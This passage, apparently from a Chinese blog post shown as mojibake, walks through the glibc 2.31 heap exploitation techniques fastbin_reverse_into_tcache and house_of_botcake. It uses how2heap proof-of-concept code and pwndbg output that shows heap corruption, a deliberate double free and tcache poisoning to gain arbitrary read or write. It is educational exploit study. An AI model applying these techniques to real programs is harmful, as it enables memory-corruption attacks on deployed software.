class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe1f8</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe218</span> â€”â–¸ <span class="number">0x555555559010</span> â—‚â€” <span class="number">0x7000000000000</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555548</span>c main+<span class="number">611</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â€”â–¸ <span class="number">0x555555559610</span> â€”â–¸ <span class="number">0x555555559660</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼ŒåŸæœ¬åœ¨fastbin çš„chunk list éƒ½è¢«æ”¾åˆ°äº† tcaceh bins é‡Œ</p><p>å¦‚æœæˆ‘ä»¬æœ€åå†malloc ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½æ‹¿åˆ°æ ˆçš„åœ°å€  ï¼ˆtcache  ä¸æ£€æŸ¥sizeåŸŸï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> â–º <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fffffffe1e0</span> â—‚â€” <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚         <span class="number">0x7fffffffe1e8</span> â—‚â€” <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fffffffe1f0</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x7fffffffe1f8</span> â€”â–¸ <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â—‚â€” ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x7fffffffe200</span> â—‚â€” <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rax r8  <span class="number">0x7fffffffe210</span> â€”â–¸ <span class="number">0x5555555594d0</span> â€”â–¸ <span class="number">0x555555559520</span> â€”â–¸ <span class="number">0x555555559570</span> â€”â–¸ <span class="number">0x5555555595c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fffffffe218</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;Ğ”UUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™ æˆ–è€…è¯»çš„åŸè¯­ï¼ˆå–å†³äºä¸‹ä¸€æ­¥å¯¹ è¿™åˆ†é…å‡ºæ¥çš„chunkè¿›è¡Œä»€ä¹ˆæ ·çš„æ“ä½œï¼‰</p><p>å®Œæ•´ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>ä¸€ç§ tcache poisoning attack ï¼Œé€šè¿‡ä¸€äº›æ‰‹æ®µï¼Œåœ¨tcachebins ä¸­å†™å…¥ç›®æ ‡åœ°å€</p><p>æ„é€ å¦‚ä¸‹æƒ…æ™¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„ tcache æ˜¯è¢«å¡«æ»¡çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> â€”â–¸ <span class="number">0x5555555597f0</span> â€”â–¸ <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x5555555595d0</span> â€”â–¸ <span class="number">0x5555555594c0</span> â€”â–¸ <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬free a å† free prev ï¼Œ ç”±äº prev ä¸  a æ˜¯ç›¸é‚» chunk ï¼Œæ‰€ä»¥ä¼šè§¦å‘åˆå¹¶ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> â–º <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>è§¦å‘åˆå¹¶åï¼Œåœ¨ unsortedbin é‡Œçš„æ˜¯ prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠ chunk a æ”¾å…¥ tcache  biné‡Œï¼Œç”±äºæ­¤æ—¶ tcache bins æ˜¯æ»¡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå–ä¸€ä¸ªå‡ºæ¥, ç„¶åå† free ä¸€æ¬¡ a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> â–º <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ a chunk å°±ä¼šè¢«æ”¾å…¥ tcahcebins é‡Œï¼ŒåŒæ—¶ prev å¯ä»¥æ§åˆ¶  chunk a çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> â€”â–¸ <span class="number">0x5555555597f0</span> â€”â–¸ <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x5555555595d0</span> â€”â–¸ <span class="number">0x5555555594c0</span> â€”â–¸ <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span 